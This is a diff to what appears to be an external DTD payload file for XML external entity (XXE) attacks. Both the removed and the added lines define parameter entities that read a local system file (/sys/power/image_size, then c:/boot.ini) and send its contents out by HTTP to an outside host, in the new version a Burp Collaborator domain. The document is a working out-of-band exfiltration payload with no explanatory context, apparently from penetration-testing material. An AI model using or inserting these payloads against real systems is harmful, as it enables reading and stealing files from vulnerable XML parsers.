@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "file:///sys/power/image_size">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+<!ENTITY % file SYSTEM "file://c:/boot.ini">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://kf3cjh79xaym4262xfsna7w0brhj58.irdko2ao8to8poerxk0ul2tei5ovck.o7w99vtsggjkbckmpkuq9kvuplvcj1.v73hruh6gei1og02z0mxs1dnye44st.burpcollaborator.net/?%file;'>">
 %all;
